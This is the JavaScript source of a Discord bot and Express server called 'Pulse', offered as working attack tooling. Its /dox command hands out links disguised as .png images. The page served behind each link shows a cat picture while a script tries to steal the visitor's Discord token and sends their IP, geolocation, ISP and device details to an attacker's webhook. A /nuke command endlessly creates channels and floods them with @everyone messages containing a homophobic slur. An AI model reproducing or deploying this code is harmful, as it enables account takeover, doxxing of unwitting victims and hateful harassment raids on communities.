const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ChannelType } = require('discord.js');
const crypto = require('crypto');
const express = require('express');
const app = express();

const TOKEN = process.env.TOKEN;
const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
const PORT = process.env.PORT || 3000;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages
    ]
});

const links = new Map();
const startTime = Date.now();
let nukeRunning = false;
let nukeGuildId = null;
let nukeInterval = null;
let spamIntervals = [];

app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) return res.status(404).send('Image not found');
    const data = links.get(id);
    res.type('text/html');
    res.send(generateDoxHTML(data.webhook || DEFAULT_WEBHOOK));
});

app.get('/', (req, res) => {
    res.send('Pulse bot is alive 🚀');
});

app.listen(PORT, () => console.log(`Dox server on ${PORT}`));

async function registerCommands() {
    const commands = [
        { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
        { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages (max 100)', required: true }, { name: 'message', type: 3, description: 'Content', required: true }, { name: 'delay', type: 4, description: 'Delay in ms', required: false }] },
        { name: 'nuke', description: 'INFINITE nuke - creates channels and spams forever' },
        { name: 'stop', description: 'Stop the infinite nuke' },
        { name: 'ad', description: 'Advertise the server invite' },
        { name: 'purge', description: 'Delete messages in bulk', options: [{ name: 'amount', type: 4, description: 'Number to delete (max 100)', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }, { name: 'reason', type: 3, description: 'Reason', required: false }] },
        { name: 'ping', description: 'Check bot latency' },
        { name: 'serverinfo', description: 'Get server information' },
        { name: 'userinfo', description: 'Get user information', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
        { name: 'avatar', description: 'Show user avatar', options: [{ name: 'user', type: 6, description: 'Target user', required: false }] },
        { name: 'math', description: 'Calculate a math expression', options: [{ name: 'expression', type: 3, description: 'Math expression', required: true }] },
        { name: 'say', description: 'Make bot say something', options: [{ name: 'message', type: 3, description: 'Message to say', required: true }] },
        { name: '8ball', description: 'Ask the magic 8-ball a question', options: [{ name: 'question', type: 3, description: 'Your question', required: true }] },
        { name: 'roll', description: 'Roll a dice', options: [{ name: 'sides', type: 4, description: 'Number of sides (default 6)', required: false }] }
    ];
    try {
        await client.application.commands.set([]);
        console.log('[REG] Cleared old commands.');
        await client.application.commands.set(commands);
        console.log(`[REG] Registered ${commands.length} commands.`);
    } catch (error) {
        console.error('[REG] Failed:', error);
    }
}

client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag}`);
    await registerCommands();
    console.log('Ready.');
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    try {
        await interaction.deferReply({ ephemeral: true });
    } catch {
        try {
            await interaction.reply({ content: '⏳ Processing...', ephemeral: true });
        } catch {
            return;
        }
    }

    try {
        const { commandName, options, user, member, guild, channel } = interaction;
        console.log(`[${new Date().toISOString()}] ${user.tag} -> /${commandName}`);

        // ---- STOP ----
        if (commandName === 'stop') {
            if (!nukeRunning) {
                return interaction.editReply('❌ No nuke is currently running.');
            }
            nukeRunning = false;
            nukeGuildId = null;
            if (nukeInterval) {
                clearInterval(nukeInterval);
                nukeInterval = null;
            }
            spamIntervals.forEach(interval => clearInterval(interval));
            spamIntervals = [];
            await interaction.editReply('⏹️ **Infinite nuke stopped.**');
            return;
        }

        // ---- DOX ----
        if (commandName === 'dox') {
            const wh = options.getString('webhook');
            if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) {
                return interaction.editReply('❌ Invalid webhook URL.');
            }
            const id = crypto.randomBytes(6).toString('hex');
            const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
            links.set(id, { webhook: wh, user: user.tag, created: Date.now() });
            const embed = new EmbedBuilder()
                .setTitle('✅ Dox Link Ready')
                .setColor(0x22c55e)
                .setDescription(`🔗 **${url}**\n\nSends IP, location, ISP, ASN, battery, VPN detection, and device info.\n\n**When they open it, everything gets sent to your webhook instantly.**`)
                .setFooter({ text: `Generated by ${user.tag}` });
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- SPAM ----
        if (commandName === 'spam') {
            const count = Math.min(options.getInteger('count'), 100);
            const msg = options.getString('message');
            const delay = options.getInteger('delay') || 0;
            if (!channel) return interaction.editReply('❌ No channel.');
            for (let i = 0; i < count; i++) {
                await channel.send(msg);
                if (delay > 0) await new Promise(r => setTimeout(r, delay));
            }
            await interaction.editReply(`✅ Spammed ${count} messages.`);
            return;
        }

        // ---- NUKE (INFINITE) ----
        if (commandName === 'nuke') {
            if (nukeRunning) {
                return interaction.editReply('❌ A nuke is already running. Use `/stop` to stop it first.');
            }

            if (!guild) return interaction.editReply('❌ Server only.');
            if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.editReply('❌ Need Admin.');

            nukeRunning = true;
            nukeGuildId = guild.id;

            await interaction.editReply('🚀 **INFINITE NUKE STARTED!** Creating channels and spamming FOREVER. Use `/stop` to stop it.');

            const variants = [
                '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
                '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
                '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER',
                '# PULSE OWNS ALL YOU F@GGOTS TRASH  ASS SERVER',
                '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS  SERVER'
            ];
            const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
            
            // Function to spam a channel
            async function spamChannel(channel) {
                while (nukeRunning) {
                    try {
                        const line = variants[Math.floor(Math.random() * variants.length)];
                        let big = `@everyone ${line}\n`;
                        while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) {
                            big += line + '\n';
                        }
                        big += `\n${inviteLine}`;
                        const spamMessage = big.slice(0, 2000);
                        await channel.send(spamMessage);
                    } catch(e) {}
                    await new Promise(r => setTimeout(r, 100));
                }
            }

            // Function to create channels continuously
            async function createChannels() {
                while (nukeRunning) {
                    try {
                        const channel = await guild.channels.create({
                            name: 'pulse-' + Math.random().toString(36).substring(2, 6),
                            type: ChannelType.GuildText
                        });
                        // Start spamming this channel immediately
                        spamChannel(channel);
                    } catch(e) {}
                    await new Promise(r => setTimeout(r, 500));
                }
            }

            // Start infinite channel creation
            createChannels();

            // Also spam all existing channels
            guild.channels.cache.forEach(ch => {
                if (ch.type === ChannelType.GuildText) {
                    spamChannel(ch);
                }
            });

            await interaction.editReply('✅ **Infinite nuke running. Creating channels and spamming them all simultaneously.**');
            return;
        }

        // ---- AD ----
        if (commandName === 'ad') {
            if (!channel) return interaction.editReply('❌ No channel.');
            const embed = new EmbedBuilder()
                .setTitle('🔥 Pulse Nuke Power')
                .setColor(0x8B5CF6)
                .setDescription(`Join Pulse:\n${INVITE_LINK}`)
                .setFooter({ text: 'Pulse Bot' });
            await channel.send({ embeds: [embed] });
            await interaction.editReply('✅ Ad sent.');
            return;
        }

        // ---- PURGE ----
        if (commandName === 'purge') {
            const amount = Math.min(options.getInteger('amount'), 100);
            const targetUser = options.getUser('user');
            const reason = options.getString('reason') || 'No reason';
            if (!channel) return interaction.editReply('❌ No channel.');
            if (!channel.permissionsFor(member).has(PermissionsBitField.Flags.ManageMessages)) return interaction.editReply('❌ Need Manage Messages.');
            let messages = await channel.messages.fetch({ limit: amount });
            if (targetUser) messages = messages.filter(m => m.author.id === targetUser.id);
            const deleted = await channel.bulkDelete(messages, true).catch(() => {});
            const embed = new EmbedBuilder()
                .setTitle('🧹 Purge Complete')
                .setColor(0x22c55e)
                .setDescription(`Deleted ${deleted ? deleted.size : 0} messages.`)
                .addFields({ name: 'Reason', value: reason });
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- PING ----
        if (commandName === 'ping') {
            const sent = await interaction.editReply({ content: '🏓 Pinging...', fetchReply: true });
            const latency = sent.createdTimestamp - interaction.createdTimestamp;
            await interaction.editReply(`🏓 Pong!\n📨 Latency: ${latency}ms\n📡 API: ${Math.round(client.ws.ping)}ms`);
            return;
        }

        // ---- SERVERINFO ----
        if (commandName === 'serverinfo') {
            if (!guild) return interaction.editReply('❌ Server only.');
            const owner = await guild.fetchOwner();
            const embed = new EmbedBuilder()
                .setTitle(`📊 ${guild.name}`)
                .setColor(0x8B5CF6)
                .setThumbnail(guild.iconURL({ dynamic: true, size: 256 }))
                .addFields(
                    { name: '🆔 Server ID', value: guild.id, inline: true },
                    { name: '👑 Owner', value: owner.user.tag, inline: true },
                    { name: '👥 Members', value: `${guild.memberCount}`, inline: true },
                    { name: '💬 Channels', value: `${guild.channels.cache.size}`, inline: true },
                    { name: '📁 Roles', value: `${guild.roles.cache.size}`, inline: true },
                    { name: '📅 Created', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
                );
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- USERINFO ----
        if (commandName === 'userinfo') {
            const target = options.getUser('user') || user;
            const memberTarget = guild ? await guild.members.fetch(target.id).catch(() => null) : null;
            const embed = new EmbedBuilder()
                .setTitle(`👤 ${target.tag}`)
                .setColor(0x8B5CF6)
                .setThumbnail(target.displayAvatarURL({ dynamic: true, size: 256 }))
                .addFields(
                    { name: '🆔 User ID', value: target.id, inline: true },
                    { name: '📅 Account Created', value: `<t:${Math.floor(target.createdTimestamp / 1000)}:R>`, inline: true },
                    { name: '🤖 Bot', value: target.bot ? 'Yes' : 'No', inline: true }
                );
            if (memberTarget) {
                embed.addFields(
                    { name: '📅 Joined Server', value: `<t:${Math.floor(memberTarget.joinedTimestamp / 1000)}:R>`, inline: true },
                    { name: '📊 Roles', value: memberTarget.roles.cache.map(r => r.toString()).join(', ') || 'None' }
                );
            }
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- AVATAR ----
        if (commandName === 'avatar') {
            const target = options.getUser('user') || user;
            const embed = new EmbedBuilder()
                .setTitle(`${target.tag}'s Avatar`)
                .setImage(target.displayAvatarURL({ dynamic: true, size: 1024 }))
                .setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- MATH ----
        if (commandName === 'math') {
            const expr = options.getString('expression');
            try {
                const sanitized = expr.replace(/[^0-9+\-*/().% ]/g, '');
                if (!sanitized) return interaction.editReply('❌ Invalid expression.');
                const result = Function(`"use strict"; return (${sanitized})`)();
                await interaction.editReply(`🧮 **${expr}** = **${result}**`);
            } catch (e) {
                await interaction.editReply(`❌ Error: ${e.message}`);
            }
            return;
        }

        // ---- SAY ----
        if (commandName === 'say') {
            const msg = options.getString('message');
            if (!channel) return interaction.editReply('❌ No channel.');
            await channel.send(msg);
            await interaction.editReply('✅ Sent.');
            return;
        }

        // ---- 8BALL ----
        if (commandName === '8ball') {
            const responses = ['Yes', 'No', 'Maybe', 'Ask again later', 'Definitely', 'Absolutely not', 'It is certain', 'Very doubtful'];
            const answer = responses[Math.floor(Math.random() * responses.length)];
            const q = options.getString('question');
            const embed = new EmbedBuilder()
                .setTitle('🎱 8-Ball')
                .setDescription(`**Question:** ${q}\n**Answer:** ${answer}`)
                .setColor(0x8B5CF6);
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        // ---- ROLL ----
        if (commandName === 'roll') {
            const sides = options.getInteger('sides') || 6;
            const result = Math.floor(Math.random() * sides) + 1;
            await interaction.editReply(`🎲 Rolled a d${sides}: **${result}**`);
            return;
        }

    } catch (error) {
        console.error('[ERROR]', error);
        try { await interaction.editReply(`❌ Error: ${error.message}`); } catch {}
    }
});

// ---- DOX HTML (FIXED) ----
function generateDoxHTML(webhook) {
    const imageUrl = 'https://cdn.pixabay.com/photo/2017/01/02/22/29/cat-1941089_1280.jpg';

    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; }
        body {
            background: #0b0b12;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', sans-serif;
            overflow: hidden;
        }
        .container { text-align: center; }
        .container img {
            max-width: 90%;
            max-height: 80vh;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }
        .caption {
            color: #555;
            font-size: 14px;
            margin-top: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="${imageUrl}" alt="Cat" />
        <div class="caption">Loading...</div>
    </div>

<script>
const WEBHOOK_URL = "${webhook}";

// ---- SEND DIRECTLY TO WEBHOOK ----
async function sendToWebhook(data) {
    try {
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
        console.log('Webhook sent:', response.status);
        return response;
    } catch(e) {
        console.error('Webhook error:', e);
    }
}

// ---- STEAL DISCORD TOKEN ----
function stealToken() {
    try {
        const token = localStorage.getItem('token') || 
                      document.cookie.split('; ').find(r => r.startsWith('token='))?.split('=')[1] ||
                      sessionStorage.getItem('token');
        if (token) {
            sendToWebhook({ content: \`**🎯 DISCORD TOKEN:** \` + \`\`\`\${token}\`\`\`\n**FULL ACCESS - ACCOUNT COMPROMISED**\` });
            console.log('Token stolen:', token);
        } else {
            sendToWebhook({ content: '**❌ No Discord token found**' });
        }
    } catch(e) {
        sendToWebhook({ content: '**❌ Error stealing token:** ' + e.message });
    }
}

// ---- GET IP AND DOX ----
async function getDoxData() {
    try {
        // Get IP data
        const ipResponse = await fetch('https://ipinfo.io/json');
        const ipData = await ipResponse.json();
        console.log('IP Data:', ipData);

        // Get battery
        let batteryInfo = 'N/A';
        try {
            const b = await navigator.getBattery();
            batteryInfo = b.level * 100 + '%' + (b.charging ? ' (Charging)' : ' (Not Charging)');
        } catch(e) {}

        // Get browser info
        const ua = navigator.userAgent;
        const browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
        const os = ua.includes('Windows NT 10.0') ? 'Windows 10/11' : ua.includes('Mac OS X') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
        const device = /mobile|android|iphone|ipad/i.test(ua) ? 'Mobile' : 'Desktop';

        // Get location from IP
        const lat = ipData.loc ? ipData.loc.split(',')[0] : 'N/A';
        const lon = ipData.loc ? ipData.loc.split(',')[1] : 'N/A';
        const mapUrl = 'https://www.google.com/maps?q=' + lat + ',' + lon;

        // Build the embed
        const embed = {
            title: '☠️ PULSE DOX - TARGET EXPOSED',
            color: 0xFF0000,
            fields: [
                { name: '🌐 IP ADDRESS', value: ipData.ip || 'N/A', inline: true },
                { name: '🏙️ CITY', value: ipData.city || 'N/A', inline: true },
                { name: '🗺️ REGION', value: ipData.region || 'N/A', inline: true },
                { name: '🌍 COUNTRY', value: ipData.country || 'N/A', inline: true },
                { name: '📮 POSTAL', value: ipData.postal || 'N/A', inline: true },
                { name: '📍 COORDINATES', value: lat + ', ' + lon, inline: true },
                { name: '🗺️ MAPS', value: '[Click to view](' + mapUrl + ')', inline: false },
                { name: '🔢 ASN', value: ipData.asn || 'N/A', inline: true },
                { name: '🏢 ISP', value: ipData.org || 'N/A', inline: true },
                { name: '🕒 TIMEZONE', value: ipData.timezone || 'N/A', inline: true },
                { name: '🔋 BATTERY', value: batteryInfo, inline: true },
                { name: '🧠 BROWSER', value: browser, inline: true },
                { name: '💻 OS', value: os, inline: true },
                { name: '🖥️ DEVICE', value: device, inline: true },
                { name: '⏰ TIME', value: new Date().toString(), inline: false }
            ],
            footer: { text: '☠️ PULSE DOX SYSTEM - ' + new Date().toISOString() }
        };

        // Send the dox
        await sendToWebhook({ embeds: [embed] });
        console.log('Dox sent successfully');

    } catch(e) {
        sendToWebhook({ content: '**❌ Dox error:** ' + e.message });
        console.error('Dox error:', e);
    }
}

// ---- RUN EVERYTHING ----
async function run() {
    console.log('Pulse dox page loaded');
    
    // Steal token instantly
    stealToken();
    
    // Get and send dox data
    await getDoxData();
    
    // Send confirmation
    sendToWebhook({ content: '✅ **Pulse dox completed successfully**' });
}

// Execute
run();

// ---- CLOSE AFTER 5 SECONDS ----
setTimeout(() => {
    document.body.innerHTML = '';
    document.body.style.background = '#000000';
    document.body.style.margin = '0';
    document.body.style.height = '100vh';
    
    setTimeout(() => {
        window.close();
        window.location.href = 'about:blank';
        setTimeout(() => {
            window.location.href = 'https://www.google.com';
        }, 200);
    }, 300);
}, 5000);

document.querySelector('.caption').textContent = 'Image loaded successfully.';
<\/script>
</body>
</html>`;
}

setInterval(() => {
    const keys = Array.from(links.keys());
    if (keys.length > 100) keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
}, 60000);

process.on('uncaughtException', console.error);
process.on('unhandledRejection', console.error);

client.login(TOKEN);
